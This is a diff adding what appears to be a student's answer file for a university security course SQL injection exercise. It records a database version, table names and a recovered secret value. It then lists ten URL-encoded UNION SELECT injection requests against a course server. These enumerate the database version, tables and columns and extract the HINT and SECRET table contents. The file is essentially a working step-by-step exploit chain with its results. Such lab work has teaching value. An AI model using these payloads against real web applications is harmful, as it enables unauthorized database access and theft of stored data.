@@ -1,0 +1,17 @@
+proj2_inject3
+5.5.50-0ubuntu0.14.04.1
+HINT, SECRET, foo, inject3_users
+brabo
+
+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=1%27+UNION+select+db_name%28%29%3B+--+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=1%27+UNION+SELECT+1%2C2%2C3%2C%40%40version+limit+1%2C1%3B+--++
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=1%27+UNION+SELECT+1%2C2%2C3%2Ctable_name+from+information_schema.tables+limit+41%2C+41%3B+--+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=1%27+UNION+SELECT+1%2C2%2C3%2Ctable_name+from+information_schema.tables+limit+42%2C+42%3B+--+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=1%27+UNION+SELECT+1%2C2%2C3%2Ctable_name+from+information_schema.tables+limit+43%2C+43%3B+--+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=1%27+UNION+SELECT+1%2C2%2C3%2Ctable_name+from+information_schema.tables+limit+44%2C+44%3B+--+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=x%27+UNION+SELECT+1%2C2%2C3%2CGROUP_CONCAT%28column_name%29+FROM+information_schema.columns+WHERE+table_name+%3D+%27HINT%27%3B+--+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=x%27+UNION+SELECT+1%2C2%2C3%2CGROUP_CONCAT%28column_name%29+FROM+information_schema.columns+WHERE+table_name+%3D+%27SECRET%27%3B+--+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=x%27+UNION+SELECT+1%2C2%2C3%2Cmessage+FROM+HINT+LIMIT+1%3B+--+
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=x%27+UNION+SELECT+1%2C2%2C3%2C+secret+from+SECRET+where+hash+%3D+%2756a87c796016c97fe1052295acc126f5%27+%3B+--+
+
